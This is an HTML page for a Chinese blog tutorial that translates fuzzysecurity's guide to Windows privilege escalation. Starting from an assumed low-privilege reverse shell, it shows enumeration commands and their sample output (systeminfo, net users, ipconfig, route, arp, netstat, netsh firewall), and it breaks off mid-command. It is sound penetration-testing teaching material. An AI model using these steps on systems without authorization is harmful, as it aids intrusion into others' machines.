@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="序言本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 提权基础（上）">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="序言本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png">
+<meta property="og:image" content="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png">
+<meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410151231_nF2KHi_Screenshot.jpeg">
+<meta property="og:image" content="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png">
+<meta property="og:updated_time" content="2018-04-13T09:14:31.374Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows 提权基础（上）">
+<meta name="twitter:description" content="序言本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。">
+<meta name="twitter:image" content="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Windows 提权基础（上） | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://03i0.com">sn00py&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://edvison.cn">Edvison&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ph0rse.me/">ph0rse&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.likesec.com">ur10ser&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Windows-提权基础（上）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/04/13/Windows-提权基础（上）/" class="article-date">
+      <time datetime="2018-04-13T09:13:10.000Z" itemprop="datePublished">2018-04-13</time>
+</a>
+
+ 
+    <a href="/2018/04/13/Windows-提权基础（上）/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2018/04/13/Windows-提权基础（上）/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows 提权基础（上）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><h4 id="本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><a href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。" class="headerlink" title="本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。"></a>本篇教程是笔者翻译国外<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">大牛fuzzysecurity 的文章</a>再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</h4><a id="more"></a>
+<h4 id="Indispensable-Resources"><a href="#Indispensable-Resources" class="headerlink" title="Indispensable Resources:"></a>Indispensable Resources:</h4><ul>
+<li>Encyclopaedia Of Windows Privilege Escalation (Brett Moore) -<a href="https://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="external">here</a></li>
+<li>Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) -<a href="https://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="external">here</a></li>
+<li>Elevating privileges by exploiting weak folder permissions (Parvez Anwar) -<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="external">here</a></li>
+</ul>
+<h2 id="Δt-for-t0-to-t3-Initial-Information-Gathering"><a href="#Δt-for-t0-to-t3-Initial-Information-Gathering" class="headerlink" title="Δt for t0 to t3 - Initial Information Gathering"></a>Δt for t0 to t3 - Initial Information Gathering</h2><h4 id="这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"><a href="#这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。" class="headerlink" title="这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"></a>这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。</h4><h4 id="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"><a href="#最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！" class="headerlink" title="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"></a>最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！</h4><h4 id="首先查看连接的是什么操作系统："><a href="#首先查看连接的是什么操作系统：" class="headerlink" title="首先查看连接的是什么操作系统："></a>首先查看连接的是什么操作系统：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//英文系统</div><div class="line">//C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">//中文系统</div><div class="line">C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div><div class="line">OS 名称:                   Microsoft Windows 7 家庭普通版</div><div class="line">OS 版本:                6.1.7601 Service Pack 1 Build 7601</div></pre></td></tr></table></figure>
+<h4 id="接下来查看主机名和当前shell-的用户名："><a href="#接下来查看主机名和当前shell-的用户名：" class="headerlink" title="接下来查看主机名和当前shell 的用户名："></a>接下来查看主机名和当前shell 的用户名：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; hostname</div><div class="line">b33f</div><div class="line"></div><div class="line">C:\Windows\system32&gt; echo %username%</div><div class="line">user1</div></pre></td></tr></table></figure>
+<h4 id="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。"><a href="#现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。" class="headerlink" title="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。"></a>现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; net users</div><div class="line"></div><div class="line">User accounts for \\B33F</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            b33f                     Guest</div><div class="line">user1</div><div class="line">The command completed successfully.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net user user1</div><div class="line"></div><div class="line">User name                    user1</div><div class="line">Full Name</div><div class="line">Comment</div><div class="line">User&apos;s comment</div><div class="line">Country code                 000 (System Default)</div><div class="line">Account active               Yes</div><div class="line">Account expires              Never</div><div class="line"></div><div class="line">Password last set            1/11/2014 7:47:14 PM</div><div class="line">Password expires             Never</div><div class="line">Password changeable          1/11/2014 7:47:14 PM</div><div class="line">Password required            Yes</div><div class="line">User may change password     Yes</div><div class="line"></div><div class="line">Workstations allowed         All</div><div class="line">Logon script</div><div class="line">User profile</div><div class="line">Home directory</div><div class="line">Last logon                   1/11/2014 8:05:09 PM</div><div class="line"></div><div class="line">Logon hours allowed          All</div><div class="line"></div><div class="line">Local Group Memberships      *Users</div><div class="line">Global Group memberships     *None</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
+<h4 id="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"><a href="#以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。" class="headerlink" title="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"></a>以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。</h4><h4 id="首先我们查看可用的网卡和路由表"><a href="#首先我们查看可用的网卡和路由表" class="headerlink" title="首先我们查看可用的网卡和路由表"></a>首先我们查看可用的网卡和路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; ipconfig /all</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line">   Host Name . . . . . . . . . . . . : b33f</div><div class="line">   Primary Dns Suffix  . . . . . . . :</div><div class="line">   Node Type . . . . . . . . . . . . : Hybrid</div><div class="line">   IP Routing Enabled. . . . . . . . : No</div><div class="line">   WINS Proxy Enabled. . . . . . . . : No</div><div class="line"></div><div class="line">Ethernet adapter Bluetooth Network Connection:</div><div class="line"></div><div class="line">   Media State . . . . . . . . . . . : Media disconnected</div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</div><div class="line">   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   </div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</div><div class="line">   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</div><div class="line">   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</div><div class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</div><div class="line">   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</div><div class="line">   Default Gateway . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCP Server . . . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</div><div class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</div><div class="line">   DNS Servers . . . . . . . . . . . : 192.168.0.1</div><div class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</div><div class="line"></div><div class="line">C:\Windows\system32&gt; route print</div><div class="line"></div><div class="line">===========================================================================</div><div class="line">Interface List</div><div class="line"> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</div><div class="line"> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</div><div class="line"> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</div><div class="line">  1...........................Software Loopback Interface 1</div><div class="line"> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</div><div class="line"> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</div><div class="line"> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</div><div class="line"> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</div><div class="line">===========================================================================</div><div class="line"></div><div class="line">IPv4 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line">Network Destination        Netmask          Gateway       Interface  Metric</div><div class="line">          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</div><div class="line">        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</div><div class="line">        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</div><div class="line">    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</div><div class="line">        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</div><div class="line">  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line"></div><div class="line">IPv6 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line"> If Metric Network Destination      Gateway</div><div class="line"> 14     58 ::/0                     On-link</div><div class="line">  1    306 ::1/128                  On-link</div><div class="line"> 14     58 2001::/32                On-link</div><div class="line"> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::/64                On-link</div><div class="line"> 14    306 fe80::/64                On-link</div><div class="line"> 14    306 fe80::8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</div><div class="line">                                    On-link</div><div class="line">  1    306 ff00::/8                 On-link</div><div class="line"> 14    306 ff00::/8                 On-link</div><div class="line"> 11    266 ff00::/8                 On-link</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line">  </div><div class="line"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; arp -A</div><div class="line"></div><div class="line">Interface: 192.168.0.104 --- 0xb</div><div class="line">  Internet Address      Physical Address      Type</div><div class="line">  192.168.0.1           90-94-e4-c5-b0-46     dynamic</div><div class="line">  192.168.0.101         ac-22-0b-af-bb-43     dynamic</div><div class="line">  192.168.0.255         ff-ff-ff-ff-ff-ff     static</div><div class="line">  224.0.0.22            01-00-5e-00-00-16     static</div><div class="line">  224.0.0.251           01-00-5e-00-00-fb     static</div><div class="line">  224.0.0.252           01-00-5e-00-00-fc     static</div><div class="line">  239.255.255.250       01-00-5e-7f-ff-fa     static</div><div class="line">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</div></pre></td></tr></table></figure>
+<h4 id="下面使用netstat-命令查看主机的网络连接和防火墙规则"><a href="#下面使用netstat-命令查看主机的网络连接和防火墙规则" class="headerlink" title="下面使用netstat 命令查看主机的网络连接和防火墙规则"></a>下面使用netstat 命令查看主机的网络连接和防火墙规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; netstat -ano</div><div class="line"></div><div class="line">Active Connections</div><div class="line"></div><div class="line">  Proto  Local Address          Foreign Address        State           PID</div><div class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</div><div class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</div><div class="line">  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    [::]:135               [::]:0                 LISTENING       684</div><div class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</div><div class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</div><div class="line">  UDP    0.0.0.0:5355           *:*                                    1100</div><div class="line">  UDP    0.0.0.0:52282          *:*                                    976</div><div class="line">  UDP    0.0.0.0:55202          *:*                                    2956</div><div class="line">  UDP    0.0.0.0:59797          *:*                                    1400</div><div class="line">  UDP    127.0.0.1:1900         *:*                                    2956</div><div class="line">  UDP    127.0.0.1:65435        *:*                                    2956</div><div class="line">  UDP    192.168.0.104:137      *:*                                    4</div><div class="line">  UDP    192.168.0.104:138      *:*                                    4</div><div class="line">  UDP    192.168.0.104:1900     *:*                                    2956</div><div class="line">  UDP    192.168.0.104:5353     *:*                                    1400</div><div class="line">  UDP    192.168.0.104:65434    *:*                                    2956</div><div class="line">  UDP    [::]:5355              *:*                                    1100</div><div class="line">  UDP    [::]:52281             *:*                                    976</div><div class="line">  UDP    [::]:52283             *:*                                    976</div><div class="line">  UDP    [::]:55203             *:*                                    2956</div><div class="line">  UDP    [::]:59798             *:*                                    1400</div><div class="line">  UDP    [::1]:1900             *:*                                    2956</div><div class="line">  UDP    [::1]:5353             *:*                                    1400</div><div class="line">  UDP    [::1]:65433            *:*                                    2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</div><div class="line">  </div><div class="line"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</div><div class="line">firewall commands are only available from XP SP2 and upwards.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show state</div><div class="line"></div><div class="line">Firewall status:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Profile                           = Standard</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line">Group policy version              = Windows Firewall</div><div class="line">Remote admin mode                 = Disable</div><div class="line"></div><div class="line">Ports currently open on all network interfaces:</div><div class="line">Port   Protocol  Version  Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">No ports are currently open on all network interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show 